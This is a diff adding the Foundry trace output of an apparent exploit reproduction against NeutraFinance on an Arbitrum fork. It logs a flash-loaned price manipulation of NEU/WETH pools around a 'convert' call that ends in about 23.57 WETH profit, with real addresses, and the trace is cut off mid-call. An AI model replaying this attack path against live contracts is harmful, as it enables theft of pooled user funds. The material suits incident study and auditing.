@@ -1,0 +1,586 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/NeutraFinance_exp.sol:CounterTest
+[PASS] test() (gas: 735176)
+Logs:
+  Attacker's WETH token balance:  0
+  After flashloan attacker's WETH token balance:  1000000000000000000000
+  Factory Address:  0x6EcCab422D763aC031210895C81787E87B43A652
+  CMLT-LP0 addresss:  0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440
+  CMLT-LP0 addresss:  0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440
+  swap token [WETH,NEU] 0.15 WETH -> NEU
+  Attacker's NEU token balance:  391971533649275456268
+  Balance of Attacker in CMLT-LP0:  0
+  Balance of Attacker in CMLT-LP0 after addLiquidity:  7390794092629250793
+  Balance of Convert in CMLT-LP1:  951992684839607319881
+  LP0 reserve0 amount:  9676390114419906659
+  LP0 reserve1 amount:  24962540698053817337183
+  LP1 reserve0 amount:  340914987794845576869846
+  LP1 reserve1 amount:  66560708590370878620
+  LP0 totalSupply amount:  476774712637538175318
+  LP1 totalSupply amount:  4759121671008920535185
+  Attacker's NEU token balance:  5010997702286527876
+  swap token [WETH,NEU] 849 WETH -> NEU
+  Attacker's NEU token balance:  24685412938658686307726
+  Attacker's WETH token balance:  150700000000000000000
+  LP0 reserve0 amount:  858676390114419906659
+  LP0 reserve1 amount:  282138757097417557333
+  LP1 reserve0 amount:  340914987794845576869846
+  LP1 reserve1 amount:  66560708590370878620
+  call the convert
+  Attacker's NEU token balance:  24685412938658686307726
+  Attacker's WETH token balance:  150700000000000000000
+  swap token [NEU,WETH]
+  Attacker's WETH token balance:  999644294038364919125
+  Balance of Attacker in CMLT-LP1:  951735531148986388193
+  CMLT-LP1 burn amount:  68157547064697183305504 13307172728756127953
+  Attacker's NEU1 token balance:  68157547064697183305504
+  Attacker's WETH token balance:  1012951466767121047078
+  swap token [NEU1,WETH]
+  Attacker's WETH token balance:  1023572628500527017010
+  LP0 reserve0 amount:  9732096076054987534
+  LP0 reserve1 amount:  24967551695756103865059
+  LP1 reserve0 amount:  340914987794845576869846
+  LP1 reserve1 amount:  42632374128208780735
+  refund flashloan
+  Attacker's WETH token balance:  23572628500527017010
+
+Traces:
+  [9353] CounterTest::setUp()
+    ├─ [0] VM::createSelectFork("arbitrum", 117189138 [1.171e8])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], "WETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(NEU: [0xdA51015b73cE11F77A115Bb1b8a7049e02dDEcf0], "NEU")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [862676] CounterTest::test()
+    ├─ [9796] WETH::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [2553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [0] console::log("Attacker's WETH token balance: ", 0) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [836179] Vault::flashLoan(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], [1000000000000000000000 [1e21]], 0x)
+    │   ├─ [3296] WETH::balanceOf(Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
+    │   │   ├─ [2553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [delegatecall]
+    │   │   │   └─ ← [Return] 11368950490460487262853 [1.136e22]
+    │   │   └─ ← [Return] 11368950490460487262853 [1.136e22]
+    │   ├─ [2350] ProtocolFeesCollector::getFlashLoanFeePercentage() [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [26900] WETH::transfer(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000000 [1e21])
+    │   │   ├─ [26154] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transfer(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000000 [1e21]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: Vault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], to: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1000000000000000000000 [1e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   │   @ 0x8e136277087394ae84bd88b3538db688c3763bf01dc7ed78e5235dc311d5959c: 0x0000000000000000000000000000000000000000000002684fe1ebcae45da285 → 0x0000000000000000000000000000000000000000000002321a183e0505bda285
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [784408] CounterTest::receiveFlashLoan([0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], [1000000000000000000000 [1e21]], [0], 0x)
+    │   │   ├─ [1296] WETH::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
+    │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
+    │   │   ├─ [0] console::log("After flashloan attacker's WETH token balance: ", 1000000000000000000000 [1e21]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [25308] WETH::approve(0xc873fEcbd354f5A56E00E710B90EF4201db2448d, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ [24562] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::approve(0xc873fEcbd354f5A56E00E710B90EF4201db2448d, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   │   │   ├─ emit Approval(owner: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xc873fEcbd354f5A56E00E710B90EF4201db2448d, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xd1c2880ed467fc05441c3899bc2f9050cf20258cbe22473b4d4acfec588c3270: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [274] 0xc873fEcbd354f5A56E00E710B90EF4201db2448d::factory() [staticcall]
+    │   │   │   └─ ← [Return] 0x6EcCab422D763aC031210895C81787E87B43A652
+    │   │   ├─ [0] console::log("Factory Address: ", 0x6EcCab422D763aC031210895C81787E87B43A652) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [2587] 0x6EcCab422D763aC031210895C81787E87B43A652::getPair(WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], NEU: [0xdA51015b73cE11F77A115Bb1b8a7049e02dDEcf0]) [staticcall]
+    │   │   │   └─ ← [Return] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440
+    │   │   ├─ [0] console::log("CMLT-LP0 addresss: ", 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [587] 0x6EcCab422D763aC031210895C81787E87B43A652::getPair(WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], NEU: [0xdA51015b73cE11F77A115Bb1b8a7049e02dDEcf0]) [staticcall]
+    │   │   │   └─ ← [Return] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440
+    │   │   ├─ [0] console::log("CMLT-LP0 addresss: ", 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [2426] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::token0() [staticcall]
+    │   │   │   └─ ← [Return] WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]
+    │   │   ├─ [2402] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::token1() [staticcall]
+    │   │   │   └─ ← [Return] NEU: [0xdA51015b73cE11F77A115Bb1b8a7049e02dDEcf0]
+    │   │   ├─ [88788] 0xc873fEcbd354f5A56E00E710B90EF4201db2448d::swapExactTokensForTokensSupportingFeeOnTransferTokens(150000000000000000 [1.5e17], 0, [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, 0xdA51015b73cE11F77A115Bb1b8a7049e02dDEcf0], CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1690921774 [1.69e9])
+    │   │   │   ├─ [11680] WETH::transferFrom(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440, 150000000000000000 [1.5e17])
+    │   │   │   │   ├─ [10928] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transferFrom(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440, 150000000000000000 [1.5e17]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440, value: 150000000000000000 [1.5e17])
+    │   │   │   │   │   ├─ emit Approval(owner: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xc873fEcbd354f5A56E00E710B90EF4201db2448d, value: 115792089237316195423570985008687907853269984665640564039457434007913129639935 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0x00000000000000000000000000000000000000000000003633b4c59152510000
+    │   │   │   │   │   │   @ 0xd1c2880ed467fc05441c3899bc2f9050cf20258cbe22473b4d4acfec588c3270: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffdeb17cb73b0ffff
+    │   │   │   │   │   │   @ 0x8a7b450b5e7ec9d92645d9ba145a7e38b33eaf5d93cc053683bf3e25f00895f0: 0x000000000000000000000000000000000000000000000000821fa1217d7b9863 → 0x0000000000000000000000000000000000000000000000008434895609ca9863
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2716] NEU::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [2529] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 9376390114419906659 [9.376e18], 24967551695756103865059 [2.496e22], 300, 300
+    │   │   │   ├─ [1296] WETH::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [staticcall]
+    │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 9526390114419906659 [9.526e18]
+    │   │   │   │   └─ ← [Return] 9526390114419906659 [9.526e18]
+    │   │   │   ├─ [3716] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::getAmountOut(150000000000000000 [1.5e17], WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1]) [staticcall]
+    │   │   │   │   └─ ← [Return] 391971533649275456268 [3.919e20]
+    │   │   │   ├─ [56738] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::swap(0, 391971533649275456268 [3.919e20], CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x, CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─ [30203] NEU::transfer(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 391971533649275456268 [3.919e20])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440, to: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 391971533649275456268 [3.919e20])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x0000000000000000000000000000000000000000000000153fb2a1198e230b0c
+    │   │   │   │   │   │   @ 0x777f26b9ce13b7de2f521e3eb15cf0b0bdbaaf0b4bae72d234a0cc78e2593c50: 0x0000000000000000000000000000000000000000000005497e626f88286552e3 → 0x0000000000000000000000000000000000000000000005343eafce6e9a4247d7
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [1296] WETH::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 9526390114419906659 [9.526e18]
+    │   │   │   │   │   └─ ← [Return] 9526390114419906659 [9.526e18]
+    │   │   │   │   ├─ [716] NEU::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 24575580162106828408791 [2.457e22]
+    │   │   │   │   ├─ [2479] 0x6EcCab422D763aC031210895C81787E87B43A652::referrersFeeShare(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [1296] WETH::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 9526390114419906659 [9.526e18]
+    │   │   │   │   │   └─ ← [Return] 9526390114419906659 [9.526e18]
+    │   │   │   │   ├─ emit Sync(reserve0: 9526390114419906659 [9.526e18], reserve1: 24575580162106828408791 [2.457e22])
+    │   │   │   │   ├─ emit Swap(sender: 0xc873fEcbd354f5A56E00E710B90EF4201db2448d, amount0In: 150000000000000000 [1.5e17], amount1In: 0, amount0Out: 0, amount1Out: 391971533649275456268 [3.919e20], to: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x012c012c0000000005497e626f88286552e3000000000000821fa1217d7b9863 → 0x012c012c0000000005343eafce6e9a4247d70000000000008434895609ca9863
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [716] NEU::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 391971533649275456268 [3.919e20]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("swap token [WETH,NEU] 0.15 WETH -> NEU") [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [716] NEU::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 391971533649275456268 [3.919e20]
+    │   │   ├─ [0] console::log("Attacker's NEU token balance: ", 391971533649275456268 [3.919e20]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [24601] NEU::approve(0xc873fEcbd354f5A56E00E710B90EF4201db2448d, 391971533649275456268 [3.919e20])
+    │   │   │   ├─ emit Approval(owner: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xc873fEcbd354f5A56E00E710B90EF4201db2448d, value: 391971533649275456268 [3.919e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x27e292b0c8edbbacd8429313c9ff8a6a0ba1701073ddb2c5416598c8ec767306: 0 → 0x0000000000000000000000000000000000000000000000153fb2a1198e230b0c
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2480] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [0] console::log("Balance of Attacker in CMLT-LP0: ", 0) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [113432] 0xc873fEcbd354f5A56E00E710B90EF4201db2448d::addLiquidity(WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], NEU: [0xdA51015b73cE11F77A115Bb1b8a7049e02dDEcf0], 150000000000000000 [1.5e17], 391971533649275456268 [3.919e20], 0, 0, CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1690921774 [1.69e9])
+    │   │   │   ├─ [587] 0x6EcCab422D763aC031210895C81787E87B43A652::getPair(WETH: [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1], NEU: [0xdA51015b73cE11F77A115Bb1b8a7049e02dDEcf0]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440
+    │   │   │   ├─ [529] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 9526390114419906659 [9.526e18], 24575580162106828408791 [2.457e22], 300, 300
+    │   │   │   ├─ [6880] WETH::transferFrom(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440, 150000000000000000 [1.5e17])
+    │   │   │   │   ├─ [6128] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transferFrom(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440, 150000000000000000 [1.5e17]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440, value: 150000000000000000 [1.5e17])
+    │   │   │   │   │   ├─ emit Approval(owner: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xc873fEcbd354f5A56E00E710B90EF4201db2448d, value: 115792089237316195423570985008687907853269984665640564039457284007913129639935 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xd1c2880ed467fc05441c3899bc2f9050cf20258cbe22473b4d4acfec588c3270: 0xfffffffffffffffffffffffffffffffffffffffffffffffffdeb17cb73b0ffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffbd62f96e761ffff
+    │   │   │   │   │   │   @ 0x8a7b450b5e7ec9d92645d9ba145a7e38b33eaf5d93cc053683bf3e25f00895f0: 0x0000000000000000000000000000000000000000000000008434895609ca9863 → 0x0000000000000000000000000000000000000000000000008649718a96199863
+    │   │   │   │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0x00000000000000000000000000000000000000000000003633b4c59152510000 → 0x000000000000000000000000000000000000000000000036319fdd5cc6020000
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [8023] NEU::transferFrom(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440, 386960535946988928392 [3.869e20])
+    │   │   │   │   ├─ emit Approval(owner: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xc873fEcbd354f5A56E00E710B90EF4201db2448d, value: 5010997702286527876 [5.01e18])
+    │   │   │   │   ├─ emit Transfer(from: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440, value: 386960535946988928392 [3.869e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x777f26b9ce13b7de2f521e3eb15cf0b0bdbaaf0b4bae72d234a0cc78e2593c50: 0x0000000000000000000000000000000000000000000005343eafce6e9a4247d7 → 0x00000000000000000000000000000000000000000000054938d7cbabc94f055f
+    │   │   │   │   │   @ 0x27e292b0c8edbbacd8429313c9ff8a6a0ba1701073ddb2c5416598c8ec767306: 0x0000000000000000000000000000000000000000000000153fb2a1198e230b0c → 0x000000000000000000000000000000000000000000000000458aa3dc5f164d84
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000000153fb2a1198e230b0c → 0x000000000000000000000000000000000000000000000000458aa3dc5f164d84
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [91348] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::mint(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─ [1296] WETH::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 9676390114419906659 [9.676e18]
+    │   │   │   │   │   └─ ← [Return] 9676390114419906659 [9.676e18]
+    │   │   │   │   ├─ [716] NEU::balanceOf(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 24962540698053817337183 [2.496e22]
+    │   │   │   │   ├─ [4513] 0x6EcCab422D763aC031210895C81787E87B43A652::feeInfo() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 40000 [4e4], 0x6a63830E24f9a2F9C295fB2150107D0390Ed1448
+    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x6a63830E24f9a2F9C295fB2150107D0390Ed1448, value: 5579851981067112 [5.579e15])
+    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 7390794092629250793 [7.39e18])
+    │   │   │   │   ├─ emit Sync(reserve0: 9676390114419906659 [9.676e18], reserve1: 24962540698053817337183 [2.496e22])
+    │   │   │   │   ├─ emit Mint(sender: 0xc873fEcbd354f5A56E00E710B90EF4201db2448d, amount0: 150000000000000000 [1.5e17], amount1: 386960535946988928392 [3.869e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x012c012c0000000005343eafce6e9a4247d70000000000008434895609ca9863 → 0x012c012c00000000054938d7cbabc94f055f0000000000008649718a96199863
+    │   │   │   │   │   @ 11: 0x000000000000000000000000000002aff7421dfef01f10ec174639f6d7cf7444 → 0x000000000000000000000000000002c5d7fa58ce5330e649502b8d08f5067bbd
+    │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x00000000000000000000000000000000000000000000000066916011b338d2e9
+    │   │   │   │   │   @ 0: 0x00000000000000000000000000000000000000000000001971eed82b0ef42305 → 0x000000000000000000000000000000000000000000000019d8940b1549680956
+    │   │   │   │   │   @ 0x9099228d67f2cac0fa5d2a34c7c210c3ca91a2ffd846816557238d9acdc76166: 0 → 0x0000000000000000000000000000000000000000000000000013d2d8873b1368
+    │   │   │   │   └─ ← [Return] 7390794092629250793 [7.39e18]
+    │   │   │   └─ ← [Return] 150000000000000000 [1.5e17], 386960535946988928392 [3.869e20], 7390794092629250793 [7.39e18]
+    │   │   ├─ [480] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 7390794092629250793 [7.39e18]
+    │   │   ├─ [0] console::log("Balance of Attacker in CMLT-LP0 after addLiquidity: ", 7390794092629250793 [7.39e18]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [24487] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::approve(0xdbd3d6040f87A9F822839Cb31195Ad25C2D0D54d, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xdbd3d6040f87A9F822839Cb31195Ad25C2D0D54d, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x3a64d0d49296bd80011a784699e3f1eeeb68f589ddeafe55c4849a52e9fbd2f5: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2480] 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4::balanceOf(0xdbd3d6040f87A9F822839Cb31195Ad25C2D0D54d) [staticcall]
+    │   │   │   └─ ← [Return] 951992684839607319881 [9.519e20]
+    │   │   ├─ [0] console::log("Balance of Convert in CMLT-LP1: ", 951992684839607319881 [9.519e20]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [529] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 9676390114419906659 [9.676e18], 24962540698053817337183 [2.496e22], 300, 300
+    │   │   ├─ [0] console::log("LP0 reserve0 amount: ", 9676390114419906659 [9.676e18]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("LP0 reserve1 amount: ", 24962540698053817337183 [2.496e22]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [2529] 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 340914987794845576869846 [3.409e23], 66560708590370878620 [6.656e19], 300, 300
+    │   │   ├─ [0] console::log("LP1 reserve0 amount: ", 340914987794845576869846 [3.409e23]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("LP1 reserve1 amount: ", 66560708590370878620 [6.656e19]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [389] 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440::totalSupply() [staticcall]
+    │   │   │   └─ ← [Return] 476774712637538175318 [4.767e20]
+    │   │   ├─ [0] console::log("LP0 totalSupply amount: ", 476774712637538175318 [4.767e20]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [2389] 0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4::totalSupply() [staticcall]
+    │   │   │   └─ ← [Return] 4759121671008920535185 [4.759e21]
+    │   │   ├─ [0] console::log("LP1 totalSupply amount: ", 4759121671008920535185 [4.759e21]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [716] NEU::balanceOf(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 5010997702286527876 [5.01e18]
+    │   │   ├─ [0] console::log("Attacker's NEU token balance: ", 5010997702286527876 [5.01e18]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [39988] 0xc873fEcbd354f5A56E00E710B90EF4201db2448d::swapExactTokensForTokensSupportingFeeOnTransferTokens(849000000000000000000 [8.49e20], 0, [0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, 0xdA51015b73cE11F77A115Bb1b8a7049e02dDEcf0], CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1690921774 [1.69e9])
+    │   │   │   ├─ [6880] WETH::transferFrom(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440, 849000000000000000000 [8.49e20])
+    │   │   │   │   ├─ [6128] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::transferFrom(CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440, 849000000000000000000 [8.49e20]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440, value: 849000000000000000000 [8.49e20])
+    │   │   │   │   │   ├─ emit Approval(owner: CounterTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xc873fEcbd354f5A56E00E710B90EF4201db2448d, value: 115792089237316195423570985008687907853269984665640564038608284007913129639935 [1.157e77])
